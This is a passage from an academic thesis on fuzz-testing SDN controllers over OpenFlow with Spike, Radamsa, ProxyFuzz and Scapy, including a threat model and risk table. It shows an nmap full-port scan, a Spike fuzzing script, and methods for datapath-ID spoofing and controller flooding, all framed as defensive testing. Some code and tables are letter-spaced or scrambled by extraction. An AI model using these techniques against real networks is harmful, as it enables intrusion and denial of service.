reproduce them using APIs. The main goal of Spike is to ﬁnd vulnerabilities in new
protocols and programs. Spike is a block fuzzer, which is an advantage compared
to other available fuzzers. The length ﬁeld in protocols can be calculated as the
size of the binary data from the beginning to the end of the block. Moreover, it is
easy to write scripts with Spike and it does not require knowledge of the C language.
Writing scripts does not mean choosing the correct fuzzing payloads because Spike
has a preloaded set of most common fuzzing strings. An additional important feature
of Spike, is that it supports diﬀerent data types and endianness for protocol ﬁelds.
In order to run Spike, we can either download, run and install it in a Linux
machine or we can use Kali Linux9, which is a penetration testing platform. The
advantage of the second choice is that Kali Linux contains all the necessary tools
to perform fuzzing and, in general, any security testing. Kali Linux can be easily
downloaded from the oﬃcial website10 and it is available for diﬀerent computer
architectures. We run the Kali Linux image in VirtualBox11.

Before explaining how to reverse a protocol and write the fuzzer using Spike, we
provide a short introduction to the most used APIs available in the framework. We
include a short description for each function.

s _ b l o c k _ s t a r t ( cha r ∗ block_name ) ;

i n t
// I t

s t a r t s a b l o c k

s_block_end ( c har ∗ block_name ) ;

i n t
// I t ends a b l o c k
// The number o f b y t e s
b l o c k i s u s u a l l y t h e l e n g t h f i e l d i n t he p r o t o c o l

from t he s t a r t

t o t he end o f

th e

9https://www.kali.org/
10https://www.kali.org/downloads/
11https://www.virtualbox.org

s _ a d d _ f u z z s t r i n g ( c har ∗ f u z z _ s t r i n g ) ;
// Add custom s t r i n g t o t h e f u z z e r

17

s _ s t r i n g ( ch ar ∗ c o n s t a n t s t r i n g ) ;

i n t
// Add a c o n s t a n t

s t r i n g t o t h e payload

s_binary ( c har ∗ i n s t r i n g ) ;

i n t
// Add a b i n a r y s t r i n g t o t h e payload

v o i d s _ s t r i n g _ v a r i a b l e ( u n s i g n e d char ∗ v a r i a b l e ) ;
// Fuzzed s t r i n g .

s_binary_block_s ize _halfword_bigendian ( char ∗block_name ) ;
// The s i z e o f

th e b l o c k i n two b y t e s

i n b i g endian o r d e r .

We apply the above functions in a simple example. According to the OpenFlow
speciﬁcation [8], a Hello packet is composed of the header and optionally of zero
or more elements. To make the example even simpler, we assume the packet has
zero elements. In other words, the Hello packet, or simply the OpenFlow header, is
composed of one byte of protocol version, one byte of packet type, two bytes of length
and lastly, four bytes of transaction id. If we capture a Hello packet in Wireshark12,
it has a structure similar to the following:

" \ x04 \ x00 \ x00 \ x08 \ x00 \ x00 \ x00 \ x01 "

The ﬁrst byte "x04" indicates the OpenFlow version 1.3. The second byte "x00"
shows the packet type, which in this case is a Hello packet. The next two bytes
"x00x08" represent the length ot the entire message. The last bytes are therefore, the
transaction id. Let’s assume we need to fuzz the last four bytes using Spike. The
snippet would be similar to the following:

s _ b l o c k _ s t a r t ( " h e l l o p a c k e t " ) ;
s_binary ( " 0 4 0 0 " ) ;
s_bin ary_bl ock_s ize_halfword_bigendian ( " h e l l o p a c k e t " ) ;
s _ s t r i n g _ v a r i a b l e ( " 0 0 00 00 0 0 " ) ;
s_block_end ( " h e l l o p a c k e t " )

The ﬁrst function call starts a block and the last call ends the "hellopacket" block.
This means that the length ﬁeld in this type of packet, is the number of bytes of the en-
tire message. The function s_binary_block_size_halfword_bigendian("hellopacket");
calculates the block size and converts it into two bytes in big-endian order. In our
example, the length is 8 bytes. The function s_binary("04 00"); adds two constant
bytes at the beginning of the message. These bytes will not be changed by the fuzzing
process. The string to be fuzzed is deﬁned by the function s_string_variable("00 00
00 00");. Spike tries ﬁrst a transaction id equal to 0 and then starts loading the set
of fuzzing strings stored in its database. This set contains the most common and

12https://www.wireshark.org/

18

useful strings used by security testers. In case we want to add new strings to Spike’s
database, we should call the function s_add_fuzzstring(char * fuzz_string);.

There are two ways to use Spike’s fuzzing libraries. The ﬁrst one is to import
spike.h from the installation directory into a C program and call the functions
described above. Alternatively, a security tester can model a protocol in ﬁles ending
with the .spk extension like in the previous snippet. In this case, we run Spike with
the following command:

$ generic_send_tcp <c o n t r o l l e r _ i p > <c o n t r o l l e r _ p o r t >
f u z z e r . spk 0 0

3.3.3 Radamsa

Radamsa [27] is a fuzzer used for robustness testing. It typically generates test cases
in order to check how a program withstands to malicious and illegal input. Radamsa
can both generate random data or read input ﬁles and produce mutations of the legal
input. The main advantages of Radamsa are that it is easy to use and conﬁgure, and
it supports diﬀerent kind of input formats. The latter is achieved through a number
of patterns and heuristic analysis. According to the presentation [28], Radamsa is a
collection of model-inferred-based fuzzers with some elements of generation based
ones.

Installing and running Radamsa can be done in a few steps as it follows:

$ g i t c l o n e h t t p s : / / g i t h u b . com/ aoh / radamsa . g i t
$ cd radamsa
$ make
$ sudo make i n s t a l l
$ radamsa −−h e l p

We list below the most common used commands with Radamsa:

|

radamsa

$ echo " 1 2 3 "
170141183460469231731687303715884105606
$ radamsa −o output−%n . t x t −n i n f ∗ . t x t
output −100. t x t
output −101. t x t
$ radamsa −g random −n 10000 −o −
a a 8 7 s d g f 2 &532 r2827
/T&GF3rh20kg3 . . .

3.3.4 ProxyFuzz

ProxyFuzz is a man-in-the-middle fuzzer written in Python. ProxyFuzz intercepts
and randomly mutates the network traﬃc between a client and a server. This fuzzer
can attack both the server and the client. It is easy to run and conﬁgure ProxyFuzz,
which can be done with the following command:

python p r o x y f u z z −l <l c l p o r t > −r <remotehost > −p <remoteport >

19

4 Test Case Design

This thesis focuses on fuzzing attacks against Software-Deﬁned Networking controllers.
The attacker might directly launch an attack against the controllers or eventually
compromise one or more switches, which are used afterwards to harm the controllers.
Our task is to test the controllers and discover vulnerabilities before the attackers in
order to make SDN networks more secure.

Security testing is a complex process that requires experience and it is essential
to conduct such testing from the early stages of the software development life cycle.
This process demands time and eﬀort and, if it is not done properly, can become
expensive. Several methods aim at increasing the quality of software testing, but
in this section, we derive test cases applying a threat modeling. The latter is a
systematic approach that allows the estimation of security threats and attacker’s
capabilities. The goal is to ﬁnd as many vulnerabilities as we can before the attackers.
Security testers should focus on threats that are more critical and more probable to
happen. Many threat modeling strategies have been proposed [29][30][31] and they
have in common these three top level steps:

• Understand the system

• Identify threats

• Mitigate threats

In this section, we deﬁne the threat model for our system, list the possible threats
and the related attacks using STRIDE methodology and rank the risks according to
the risk management process.

4.1 Understand The System

As mentioned above, the ﬁrst step of threat modeling is to understand the system.
We will refer very often to the SDN architecture as shown in the Figure 1. The
following assumptions are valid regarding our environment:

1. Switches communicate with controllers using the OpenFlow protocol.

2. Attackers compromise at least one switch or connect to the SDN controller

using their own malicious switches.

3. The remaining switches operate correctly with the controller according to the

OpenFlow speciﬁcation as described in section 2.2.1.

4. Switches are not authenticated to the controllers. In a common scenario, only

the controller is authenticated to the switches.

The security of a system cannot be understood without talking about assets,
which are everything of a value in a system. Assets are what needs to be protected
and what is really worth to a company. Harming the central assets might cause

20

Figure 4: SDN Assets

critical damage to the business. At a high level of abstraction, the assets in SDN are
described in red in Figure 4.

At a lower level of abstraction, we would have to include management passwords,
ﬂow tables, communication keys or other sensitive information. Analyzing the broad
range of assets that comprise the SDN architecture requires a lot of eﬀort and goes
beyond the scope of this thesis. We focus in testing the security of SDN controllers and
more precisely, the implementation of a southbound interface such as the OpenFlow
protocol. Therefore, the SDN controllers, switches and the southbound API are the
assets to be protected. The northbound API and SDN applications are excluded
from the study in this work.

Assets are exposed to the external environment where the attacker is located.
The boundary, where assets contact with the external environment, is called surface
area. This is where the attack can hit. The surface area is composed of many entry
points, which are the inputs that a user or any other application sends to the SDN
ecosystem. The entry points of OpenDaylight controller version 3.3 and 4.0 are the
same and are described in Figure 5.

The entry points are slightly diﬀerent in case of the ONOS controller as shown in

Figure 6.

A SDN controller listens on ports 6653 and 6633 for OpenFlow network packets
from switches. IANA has assigned the port 6653 for the OpenFlow protocol [32]. In
addition, both OpenDaylight and ONOS listen on port 6633 for backward compati-
bility with switches that support OpenFlow version 1.0 as stated in the speciﬁcation

21

Figure 5: SDN Architecture

Figure 6: SDN Architecture

[33]. These are the interfaces we use to conduct fuzz testing.

NorthBound APIs are additional entry points where the attacker can insert
malicious input. ODL exposes port 8181 by default and port 8080 for legacy reasons
to receive REST API requests. ONOS listens only on port 8181 for REST API
requests. Moreover, ODL, like ONOS, runs a web server on port 8181 for a graphical

22

management user interface. In this work, we do not test the services listening on
these ports, but we call the northbound REST APIs to drive certain actions in the
controllers that lead to communication with the switches. An example of such actions
is ﬂow addition and removal. When a user adds or removes a ﬂow by calling the
correspondent REST API, the controller sends a Flow Mod packet to the switch.

Although we do not fuzz user input in the network management web server,
controllers receive information from switches using OpenFlow and display it in the
browser. Such ﬂow of information can lead to web-based vulnerabilities such as XSS,
SQL or format string vulnerabilities. For example, a switch sends to its controller
the manufacturer description, which can contain an XSS script.
If the network
administrator views such information in the browser, Javascript code might be
executed allowing the adversary to steal sensitive information or download malicious
ﬁles into the administrator’s workstation.

Controllers expose additional services and listen to ports which are not listed
above. Such ports, except the debugging one, are outside the interest of this thesis.
If OpenDaylight and ONOS are executed with the debugging option enabled, these
controllers listen on port 5005 for connections from remote debuggers. Debugging is
crucial to monitor faulty behavior and to determine test cases’ success or failure.

In case of multiple SDN controllers in the network, intra-communication between
controllers might potentially be a dangerous entry point in the system. For instance,
ONOS listens on port 9876 for connections from other controllers. Two or more
controllers sharing the network state together, form a cluster. Communication
within clusters does not follow OpenFlow protocol and is not included in the test
implementation. However, test cases are executed when ONOS runs in standalone
and cluster mode.

4.2 Identify Threats

After the system is fully understood, the next step involves identifying speciﬁc threats
and attack scenarios. A threat is the adversary’s goal to commit a damage to a
system. Threats may range from inside developers who possess the credentials to
external attackers, from authorized users to attackers who masquerade themselves as
legitimate users. Threats can be identiﬁed by analyzing each asset and applying one
of the following threat categories [31]:

• Spooﬁng: The adversary impersonates a legitimate entity to fool another legal

participant. Spooﬁng violates the authentication security property.

• Tampering: This kind of attacks implies the attacker violating data integrity
and modifying the original information to insert malicious input. An example
can be modifying packets traveling in the network.

• Repudiation: The adversary may deny that an event happened. Therefore,
the system must keep track and evidence of entities executing events. System
designers should guarantee the property of non-repudiation, for example, for
log ﬁles that may be used as forensic evidence.

23

• Information Disclosure: A user can be exposed to information such as Open-
Flow ﬂow tables or databases without the required authorization. Conﬁdential-
ity is the violated property.

• Denial of Service: A system should be available but legitimate users are denied

access to services.

• Escalation of Privilege: The adversary gains more privileges to the system

than he is assigned.

Section 3.2 states that fuzzing fails to ﬁnd bugs related to access control. Such
bugs fall under the Escalation of Privilege and Repudiation categories. Therefore,
we will not consider threats belonging to these categories.

Spooﬁng

• Datapath ID: The switch identiﬁer is the datapath ID parameter sent in the
Features Reply packet to the controller. If the attacker modiﬁes such parameter
in order to match an existing switch identiﬁer, the controller can disconnect
the old honest switch and continue the communication with the new malicious
one.

• Disconnected switch: When a switch disconnects for a short time, the attacker
can insert fake information into the controller using the datapath ID of the
disconnected switch. The controller should query the switch after reconnection,
for example using multipart requests, to retrieve information regarding ﬂows,
tables, queues or groups. At this moment, the controller should discard fake
information inserted during disconnection.

Tampering

• Modiﬁcation of controller’s data: From a general point of view, tampering
includes all the threats related to unauthorized modiﬁcation of the controller’s
data. Such data include ﬂow tables, queues, meters, groups or any other
information that controllers store about their switches.

Information Disclosure

• Timing analysis: After sending manipulated packet in messages to the con-
troller, the attacker can measure the response time and reveal information
about the controller’s strategy and existing ﬂows.

• Derive network topology:

If the malicious switch sends crafted packet in
messages to the controller, the attacker can derive useful information about
the network topology.

Denial of Service

24

• Software crash: Vulnerabilities that cause controllers to crash pose a critical
risk. Sending forged packets might cause the controller to parse them incorrectly
and therefore crash.

• Large log ﬁle: Excessive amount of logging can increase the size of the log
ﬁle. Full disk size might interrupt normal network operations. If a certain
manipulated packet causes a large quantity of text to be written in the log
ﬁle, then sending such packet multiple times results in the log ﬁle size growing
linearly.

• Generate high traﬃc load:

If the switch sends a large number of packets to
the controller, the latter might consume more resources to take a decision and
to create ﬂows that forward packets to their respective destinations.

• Increased resource consumption:

Incorrect parsing of packets, deadlocks, or
large number of threads created might become the source of an abnormal
growth of resource consumption. Therefore, the remaining amount of memory,
CPU or bandwidth might not be enough to serve other legitimate users.

As stated by Shostack et al. [29], STRIDE methodology is very abstract and quite
often it is necessary to ﬁnd a more detailed list of attacks depending on the system
under test. Such lists have been collected and published in attack libraries. The choice
of an attack library depends on level of detail, scope and audience. Considering
such factors, we extend the above test cases by selecting attacks from CAPEC
attack catalog [34]. CAPEC stands for Common Attack Pattern Enumeration and
Classiﬁcation and is an online library of common attack patterns classiﬁed according
to speciﬁc domains. At the moment of writing this thesis, the number of domains
appears to be around 3000 divided into six major categories [35]:

• Social Engineering

• Supply Chain

• Communications

• Software

• Physical Security

• Hardware

Categories such as Social Engineering, Supply Chain and Physical Security go
beyond the scope of this thesis and are not considered here. The remaining categories
oﬀer a great support to expand the list of threats.

Communications

25

• CAPEC-158: Sniﬃng Network Traﬃc: An attacker monitors the communi-
cation between switches and controllers. This is a passive attack in contrast
to fuzzing, but interception might become useful for the attacker to extract
sensitive information. For instance, the attacker sniﬀs the OpenFlow Features
Reply packet or a REST API request containing the datapath ID of a legitimate
switch. Consequently, such data might help the adversary to run spooﬁng
attacks.

• CAPEC-272: Protocol Manipulation: The main goal of this thesis focuses on
manipulating the OpenFlow protocol packets to test diﬀerent SDN controller
implementations. Thus, this attack cannot be implemented as a single test
case but comprises all the remaining attacks connected to fuzzing.

• CAPEC-18: Embedding Scripts in Non-Script Elements: This category of
attacks includes diﬀerent forms of Cross-Site Scripting (XSS). A prerequisite
for such attacks to succeed, is that the web browser must allow Javascript
execution. A malicious switch can incorporate harmful XSS code in string ﬁelds
in OpenFlow packets. The network administrator can show this information
in the browser through the management web server. If such code is displayed
and executed in the browser, it poses a threat for the network administrator
workstation.

Software

• CAPEC-66: SQL Injection: The attacker can inject parameters or commands
in the packet ﬁelds, which might cause SQL and format string 13 injections.

Hardware

• CAPEC-169: Footprinting: This kind of attack aims to gather as much
information as possible about the target. Such information can include the
identity of hosts in a network, open ports and running services in the system
under test. Although not related to fuzz testing, we consider the scenario when
the attacker needs to identify the location of the controllers in the network by
performing footprinting. Such process is described in detail in section 5.

13CAPEC-135: Format String Injection https://capec.mitre.org/data/deﬁnitions/135.html

26

• CAPEC-440: Hardware Integrity Attack: The target SDN controllers might
not be reachable from outside the internal network. Thus, the attacker might
physically insert one ore more malicious switches at the target location. This
threat does not inﬂuence the fuzz testing methodology and implementation.

4.3 Risk Management

After understanding and evaluating threats, many authors support the idea of doing
risk management [22] [30] [36] [37] [38]. This process allows business managers to
identify risks and costs related to risks. If protecting from threats is more expensive
than not defending at all, risks are not mitigated. The objective of risk management
is to reduce the risk related to potential threats, to an acceptable level that does not
undermine business goals.

According to Peltier et al. [37], risk management is composed of four distinct

processes:

• Risk analysis: This process aims at identifying events or factors that can be

harmful to the business goals.

• Risk assessment: Risk is estimated quantitatively o qualitatively as a function

of assets, threats and vulnerabilities and represented by the formula:

Risk = assets × threats × vulnerability

Sometimes risk is evaluated as a product of the probability that a threat occurs
and the consequence of such event:

Risk = probability × impact [37]

• Risk mitigation: This process implements countermeasures how to prevent

risks from occurring.

• Vulnerability assessment and controls evaluation:

Infrastructure is observed

to determine the adequacy according to the security policies.

We already completed the process of Risk Analysis because we listed what poses
a threat to the business goals. The next step, also known as Risk Assessment, is to
quantitatively estimate the security impact rating of the threats on a four-point scale
(low, moderate, important and critical) in concordance with OpenDaylight [39] and
ONOS [40] security advisories. ODL provides a description for the previous scale
[41]:

• Critical: Vulnerabilities pose a critical risk if allow remote code execution or

remote exploitation from unauthenticated attackers.

Probability
of occurrence
High
Low

Threat

Datapath ID
Disconnected switch
Modiﬁcation
of controller’s data
Timing analysis
Low
Derive network topology Low
High
Software crash
Medium
Large log ﬁle

Low

Generate high
traﬃc load
Increased
resource
consumption
Sniﬃng network traﬃc
Protocol manipulation
Embedding scripts
in non-Script elements
SQL injection
Footprinting
Hardware
Integrity Attack

High

High

High
High

Low

Low
Low

Low

27

Impact

Risk

High
High

High

Low
Low
High
High

Critical
Important

Moderate

Low
Low
Critical
Moderate

High

Critical

High

Critical

Low
Moderate
Medium Important

Medium Moderate

Medium Moderate
Low

Low

Low

Low

Table 2: Risk assessment

• Important: Vulnerabilities are ranked Important if they compromise the
conﬁdentiality, integrity and availability (CIA) of resources. Such vulnerabili-
ties comprise denial of service attacks or ﬂaws that allow local users to gain
privileges.

• Moderate: This rating is given to vulnerabilities that cannot be exploited but

that could lead to some compromise of CIA properties of a system.

• Low Vulnerabilities are ranked Low, if exploitation causes minimal conse-

quences.

Risk assessment is a subjective activity. It is the task of the security tester to
evaluate the probability of occurrence, the impact and the risk of a threat. The table
2 summarizes our estimated risk of the threats identiﬁed in section 4.2.

Typically, a security tester follows a risk-based approach and pays attention to
assess ﬁrst the vulnerabilities to threats ranked Critical. He spends less resources on
threats ranked Low.

The last two processes, risk mitigation and vulnerability assessment and controls

evaluation, are described in the next chapters.

28

5 Test Implementation

In section 4, we discussed the potential threats to SDN controllers. We now proceed
analyzing tools that can assess such threats and describe how to conﬁgure the test
environment and implement test cases.

5.1 Choosing The Right Fuzzer

Choosing the right fuzzer was a diﬃcult task considering the large number of available
tools. Many of them are commercial software; many are not available in Linux;
many fuzzers test ﬁle format parsing, while our scope is to test a network protocol
implementation. It is worth mentioning that we do not use as a criteria the number
of vulnerabilities that fuzzers have discovered in the past. In contrast, we select the
right fuzzers based on the following characteristics:

• Cost: We analyze only free and open-source fuzzers.

• Platform: Fuzzers that run in the Linux environment are preferred over those

running in other platforms.

• Network protocol fuzzer: As mentioned above, many fuzzers test only ﬁle

formats, but we require the tools to be able to test a network protocol.

• Ease of use: The tools need to be easy to conﬁgure and use. Good documen-

tation is a signiﬁcant advantage.

• Customization: A good fuzzer should allow customization and automation

according to the speciﬁc needs of the security tester.

• Fuzzing method: Many fuzzers support only random generation of input data.
Understanding how the protocol works or mutating current samples of the
protocol are crucial requirements for a good fuzzer.

A summary of the selected fuzzers and their properties is shown in Table 3.
In addition, we display in Table 4 a list of possible fuzzers to consider for future

development of this work.

5.2 Test Environment

We take advantage of virtualization to execute test cases. Ubuntu 15.1014 operating
system runs in the virtual machine using VirtualBox 5.0.12 15. Depending on the test
case, we create a realistic virtual network using Mininet 2.2.116. The latter allows
users to create SDN networks with diﬀerent topologies, experiment with OpenFlow,
interact and customize network elements. More details about the conﬁguration of

14http://releases.ubuntu.com/15.10/
15https://www.virtualbox.org/
16http://http://mininet.org/

29

Cost

Platform

Network

Ease of use

Customization

Spike

Free

Linux

Yes
Medium. Not
well documented
Yes,
exposes API

Methodology

88

Scapy

Radamsa

ProxyFuzz

Free
Linux,
Windows
Yes

Easy

Yes

788

Free

Linux

Yes

Easy

No

Free

Linux

Yes

Easy

No

Mutation and
generation based

Mutation based

Table 3: Selected fuzzers

Defensics[42] AutoFuzz[43]

Peach[44]

Snooze[45]

Cost

Commercial

Free

Platform

NA

Windows

Network

Yes,
supports
OpenFlow

Yes

Free

Linux

Yes

Ease of use

NA

Customization NA

Methodology

NA

Easy,
supports GUI

Allows
extensions to
new protocols

Fuzzes protocol
based on ﬁnite
state machine

Diﬃcult,
requires protocol
modeling in XML

Allows
extensions to
new protocols
Intelligent
fuzzing
derived from
protocol
speciﬁcation

Table 4: Alternative fuzzers

NA
Linux,
Windows

Yes

Medium,
requires
Snooze libraries
in Python
Allows
extensions to
new protocols

Stateful
protocol
fuzzer

30

Role

SDN Controller

Version
OpenDaylight Lithium-SR3,
OpenDaylight Beryllium, ONOS 1.5
Mininet 2.2.1
Ubuntu 15.10, Kali Linux 2.0
VirtualBox 5.0.12

Network Emulator
Operating System
Virtualization
Development Environment Java JDK 1.8, Python 2.7
Project Management
Fuzzers

Maven 3.3.3
Spike, Scapy 2.2, Radamsa 0.4, ProxyFuzz

Table 5: Test environment

Mininet are given in the next sections as it depends on the speciﬁc test case. For
simplicity, Mininet SDN network runs in the same virtual machine as the controller
except in particular cases testing with Spike. As mentioned in the section 2.3, the
system under test is either the OpenDaylight or ONOS SDN controller. These
controllers listen by default on ports 6633 and 6653 for incoming connections from
switches. To avoid any conﬂicts, especially related to listening on the same port, we
run the test suite separately for each controller. Tests are designed based on diﬀerent
methodologies, but all the test cases behave like a malicious SDN switch and connect
to the ports mentioned above.

Other software requirements are Python 2.7 to execute some of the test cases,
Java JDK 1.8 to run the controllers, Kali Linux17 to run Spike, Maven18 for software
project management and so on. Table 5 contains the full list of software requirements
to properly set up the testing environment.

In section 3.2, we described mutation-based and generation-based fuzzers. The
ﬁrst type mutates existing data to create cases, while the second type generates
malicious input from the protocol model. Not all the fuzzers support both categories;
therefore we deploy several testing environments. Our main contribution is a set of
test cases written in Python with the help of Scapy llibraries. In contrast, in some
cases, correctly conﬁguring the fuzzer is suﬃcient to test the applications.

Figure 7 shows how Scapy is used in a client-server model to behave like a
malicious SDN switch. Test cases are written in Python, but import Scapy library.
After connecting to the listening ports of the controllers, Scapy starts the fuzzing
engine and sends illegal packets. Depending on the type of test, this tool might set
several simultaneous connections with the controllers.

In case of Spike, the client-server architecture is similar to Scapy. The main
diﬀerence is the fact that Spike can be used in two diﬀerent ways. Spike’s main
binary ﬁle (named generic_send_tcp) can receive in input the protocol speciﬁcation,
or alternatively, the security tester can import spike.h which is Spike’s C library. We
didn’t explore the second option because of the challenges risen by programming in
C and because the derived test cases could be implemented with Scapy with less

17https://www.kali.org/
18https://maven.apache.org/

31

Figure 7: Scapy setting one or more connections to port 6653 of the SDN controller

work. Figure 8 shows testing environment with Spike in the ﬁrst case. Typically,
each OpenFlow packet is modeled in diﬀerent .spk ﬁles.

Figure 8: Spike fuzzer

Both the tools mentioned above belong to the generation-based fuzzers category
because fuzzing is conducted after interpreting the protocol. In opposite to this,
ProxyFuzz[46] sits in the middle of the connection between the switch and the
controller and randomly modiﬁes packets. Therefore, this man-in-the-middle dumb
fuzzer resides in the mutation-based category.
In this scenario, Mininet virtual
switches connect to ProxyFuzz, which connects to the controller as shown in the
Figure 9.

Radamsa is a powerful tool that supports both generating and mutating data.
Radamsa may read the legal input from ﬁles or stdin and oﬀers a large variety of
mutation patterns. These patterns ﬂip, drop, swap, remove, add and repeat bytes
from the original input. We take advantage of Radamsa to build a large database of
random sequences of bytes which are placed in the correct position in the packets
with the help of Scapy. In addition, Radamsa is a valuable tool when it comes to

32

Figure 9: Proxyfuzzer

mutating valid strings from a legal communication using the OpenFlow protocol. We
extract the strings that Mininet Switches send to the controller, dump them into ﬁle
and exploit Radamsa’s mutation patterns. The output is again parsed in packets
using Scapy as shown in Figure 10.

Figure 10: Radamsa fuzzer

5.3 Implement The Test Strategy

Before describing how test cases are implemented and threats are assessed, it is
worth considering a typical black-box scenario when the attacker knows the IP range
of the SDN network but not the speciﬁc IP address of the controller. Therefore,
the attacker has to perform a preliminary step in order to discover the host that
runs the controller service. This step is called Network Scanning as described in
section 3.1. Nmap19 is a popular and powerful port scanner that lists active hosts
in a network and attempts to identify running services on those hosts based on the
gathered information from the hosts’ open ports. Nmap supports a variety of scan

19https://nmap.org/

33

types that can be useful, for example, to avoid ﬁrewall detection. It is the attacker’s
task to adapt nmap options according his needs, but we aim at ﬁnding the server
that hosts the SDN controller. By default, SDN controllers listen on ports 6633 and
6653 but network administrators can conﬁgure diﬀerent ports. Thus, we run the
scan on all the ports. The nmap scan command is shown below:

$ sudo nmap −A −sS −p 1−65535 <IP_Range>

The arguments -A tells nmap to enable OS version detection, script scanning and
traceroute. Such information is not essential but might be useful for the attacker to
get to know better the environment. The option -sS allows fast scanning of hosts
in order to discover running services. The last -p argument instructs nmap to scan
the whole port range. In addition, nmap receives network IP range as input in
the format 192.168.1.0/24, 192.168.1.1-24 and so on. In this scenario, the network
scanner performs a half-open TCP connection to a port, or in other words, sends a
SYN packet to the target and waits for the response. The response is compared with
nmap’s database to identify the service listening on that port. For simplicity, we
assume the target runs OpenDaylight controller on port 6633 and 6653. In addition,
ODL runs a web server which listens on ports 8080 and 8181 for REST API requests.
Below, we show the partial output of the above command from nmap.

h tt p
h tt p

open
open

open
open

unknown
unknown

J e t t y 8 . 1 . 1 5 . v20140411
J e t t y 8 . 1 . 1 5 . v20140411

6633/ tc p
6653/ tc p
. . .
8080/ tc p
8181/ tc p
. . .
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)
SF−Port6633−TCP:V=7.12% I=7%D=5/12%Time=57349286%P=x86_64−unk
SF:% r (NULL, 1 0 , " \ x04 \0\0\ x10 \0\0\0\ x15 \0\ x01 \0\ x08 \0\0\0\ x12 "
SF : es , 1 0 , " \ x04 \0\0\ x10 \0\0\0\ x15 \0\ x01 \0\ x08 \0\0\0\ x12 ")% r (
. . .
SF−Port6653−TCP:V=7.12% I=7%D=5/12%Time=57349286%P=x86_64−unk
SF:% r (NULL, 1 0 , " \ x04 \0\0\ x10 \0\0\0\ x15 \0\ x01 \0\ x08 \0\0\0\ x12 "
SF : es , 1 0 , " \ x04 \0\0\ x10 \0\0\0\ x15 \0\ x01 \0\ x08 \0\0\0\ x12 ")% r (
. . .

Nmap does not recognize the OpenDaylight service, but we can manually identify
the response "\x04\0\0\x10\0\0\0\x15\0\x01\0\x08\0\0\0\x12" as a Hello packet
of the OpenFlow 1.3 protocol. For instance, the ﬁrst byte \x04 indicates the protocol
version 1.3.

Beside Network Scanning, we described in section 3.1 other two types of security
testing: vulnerability scanning and penetration testing. A vulnerability scanner is a
software that identiﬁes hosts, running services and any known vulnerabilities related
to such hosts or services. Revealing unknown ﬂaws poses a challenge for vulnerability
scanners. The goal of this thesis is to identify unknown vulnerabilities, therefore,

we do not investigate deeply this category of tools. Nexpose20 and Nessus21 are two
well-known vulnerability scanners.

The following paragraph describes how the test cases planned in section 4 are

34

implemented.

Spooﬁng

• Datapath ID: This parameter is a 8 byte ﬁeld in the Feature Reply packet and
identiﬁes a particular switch. If the security tester knows the datapath id of
another switch, he can set the ﬁeld to the datapath ID of the honest switch
using Scapy. Otherwise, the probability to guess the correct datapath ID is
1/264. Sniﬃng the network increases the chances to capture existing datapath
IDs.

• Disconnected switch: This scenario can be automated using Scapy. The
legitimate switch is emulated in Mininet. The switch is disconnected for a
short period of time in order to create space for the malicious switch to insert
fake information through multipart reply messages. Datapath IDs of both
the switches should match for the attack to succeed. Afterwards, the Mininet
switch is reconnected and the controller’s state is queried. For instance, in
OpenDaylight, opendaylight-inventory the northbound REST API retrieves
the information the controller stores about switches. Spooﬁng is avoided if this
information coincides with the Mininet switch multipart reply messages.

Denial of Service

• Generate high traﬃc load: Packet can be sent out sequentially or in parallel.
Sequentially, it is possible to send multiple packets within the same connection
or by starting new ones. For example, in the case of asymmetric messages such
as packet in or ﬂow removed that are unidirectional from the switch to the
controller, it would be a good idea to ﬂood the controller with thousands of
packets in the same connection. Alternatively, for messages initiated by the
controller such as a multipart request, which requires the switch to send a
multipart reply packet stress testing seems a feasible option. In other terms,
the switch can send a multipart reply, terminate the connection and start a
new one. This procedure is repeated thousands of times. The goal of this
scenario is to discover if the controller handles successfully the cases where a
huge number of switches is connected in a short time. Both the above test
cases are implemented in Scapy. In parallel, the security tester can exploit the
beneﬁts of multithreading and imitate a large number of switches using Scapy.
In this attack, many switches connect simultaneously to the controller. The
controller should have a mechanism that limits the rate of new connections in
order to avoid denial of service attacks.

20https://www.rapid7.com/products/nexpose/
21http://www.tenable.com/products/nessus-vulnerability-scanner

35

• Software crash, large log ﬁle, increased resource consumption: For simplicity,
all these threats are implemented in the same way. Typically, a packet that
is parsed incorrectly can cause the controller to launch an exception. Such
exception is probably logged in a ﬁle, may kill a thread or, in the worst case,
may crash the entire software. Several fuzzing techniques have been employed
to cause denial of service attacks.

The ﬁrst technique is random fuzzing of on-the-ﬂy packets using ProxyFuzz.
This dumb fuzzer acts as a proxy between the switch and the controller and
randomly selects a packet and mutates it. The mutated packet can be the
Hello message at the beginning of the conversation or packet in. In the second
case, ProxyFuzz does not inﬂuence the communication between the switch and
the controller up to the packet in message. This fuzzer supports bit ﬂipping,
buﬀer overﬂows and format string operators. When bit ﬂipping is applied, 7%
of the bytes in the packet is randomly modiﬁed.

Radamsa supports even more operators than ProxyFuzz but can be used only
to fuzz the ﬁrst packet of the protocol (i.e. Hello packet in OpenFlow). To
exploit the power of Radamsa, we merge the functionality of Radamsa and
Scapy. In other words, Radamsa generates random or mutated output and
dumps it in a ﬁle. Scapy reads the ﬁle and inserts it whenever it is necessary
in the OpenFlow ﬁelds. The ﬁrst use of Radamsa is to generate a huge list of
random strings. Considering that random fuzzing is the least eﬃcient method,
it is worth applying mutation techniques to existing OpenFlow packets. For
example, if a packet contains the string OpenFlow, Radamsa reads such string in
input and produces the output OpenFnFlenFlow. The product is a combination
of a number of mutation operators such as drop a byte, ﬂip a byte, repeat a
byte, permute some bytes or repeat a sequence of bytes.

Another technique requires modeling the protocol in C using a framework such
as Spike. Developing test cases in C with the help of Spike, requires a lot of
time and eﬀort. Therefore, we modeled only the Hello packet in Spike and
the rest in Scapy. Spike supports a large library of the most common fuzzing
strings, which can be extended further with custom strings. The number of
payloads exceeds one thousand. The library aims at discovering several types
of attacks comprising integer overﬂows, buﬀer overﬂows, path traversal, format
strings, SQL injections, command injection or other injection methods with
special or non-ASCII characters. Explaining the type and eﬀect of such attacks
goes beyond the scope of this thesis. However, it is worth providing an example
how fuzzing is done in the transaction ID ﬁeld in the Hello packet. This packet
is composed of 4 ﬁelds: OpenFlow version, packet type, packet length and
transaction ID. The ﬁrst two ﬁelds remain ﬁxed and are represented in Spike
with the command s_binary("04 00"). Spike calculates automatically the packet
length if the commands are wrapped in a block section, as explained in section
3.3.2. Afterwards, the fuzzer inserts all the payloads in the transaction ID
ﬁeld. Obviously, some payloads are longer than the constant length of the ﬁeld,
which is 4 bytes.

36

Spike is not the only option to model a protocol. Scapy can be used to manually
